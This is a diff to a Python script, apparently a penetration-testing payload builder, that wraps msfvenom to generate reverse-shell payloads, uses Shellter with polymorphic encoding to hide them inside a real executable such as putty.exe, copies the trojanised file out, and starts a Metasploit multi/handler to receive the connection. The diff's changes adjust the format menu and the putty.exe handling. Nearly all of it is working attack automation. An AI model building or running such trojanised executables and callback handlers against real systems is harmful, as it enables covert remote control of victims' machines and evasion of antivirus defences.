@@ -98,7 +98,8 @@ ipaddr = raw_input("\033[0;31mPlease enter LHOST IP Address [" + inteth_ip + "]:
 lport = raw_input("\033[0;31mPlease enter LPORT TCP Port [" + lport + "]: \033[0m") or lport
 #outputloc = raw_input("\033[0;31mPlease enter Output location of Payload [" + outputloc + "]: \033[0m") or outputloc
 print""
-print "java-applet, asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war"
+print "java-applet, macro"
+print "asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war"
 payloadformat = raw_input("\033[0;31mPlease enter value for the Payload format [" + payloadformat + "]: \033[0m") or payloadformat
 print ""
 
@@ -183,9 +184,9 @@ if payloadformat == 'java-applet':
 
 elif payloadformat == 'exe':
 	shellter = raw_input("\033[0;31mDo you want to shellter the executable [Y/n]: \033[0m") or "Y"
-	shellterexe = raw_input("\033[0;31mUse putty.exe as the executable in shellter [Y/n]: \033[0m") or "Y"
-
+	
 	if (shellter == "Y") or (shellter =="y"):
+			shellterexe = raw_input("\033[0;31mUse putty.exe as the executable in shellter [Y/n]: \033[0m") or "Y"
 			with open(outputloc + outputname, "w") as outfile:
 				subprocess.call('msfvenom -f ' + "raw" + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
 
@@ -200,7 +201,8 @@ elif payloadformat == 'exe':
 				shellterpayloadexe = raw_input("\033[0;31mPath to real executable that can be used in shellter: \033[0m")
 
 			os.system("wine "+shellterdir+"shellter.exe -f "+shellterpayloadexe+" -p "+msfpay+" --encode --handler iat --polyiat --polyDecoder")
-
+			shellterputtyback = shellterdir+"putty.exe"
+			os.system ("cp %s %s" % (shellterputtyback, outputloc))
 	else:
 		with open(outputloc + outputname, "w") as outfile:
 			subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
@@ -214,18 +216,3 @@ handler = raw_input("\033[0;31mSetup multi/handler [Y/n]: \033[0m") or "Y"
 
 if (handler == "Y") or (handler =="y"):
 	subprocess.call('msfconsole -x "use multi/handler; set PAYLOAD ' + payload + '; set LHOST ' + ipaddr + '; set LPORT ' + lport + '; exploit -j;"', shell=True)
-
-
-# Use shellter, at the top say where shellter is
-
-# wine shellter -f explorer.exe -p ksr1FB1.x86.dll --reflective z --encode --handler iat --polyiat --polyDecoder
-
-# do you want to use 
-
-# do you want a reflective dll
-
-
-## SE TESTING
-# do you want a java applet
-# do you want oneclick
-# do a macro
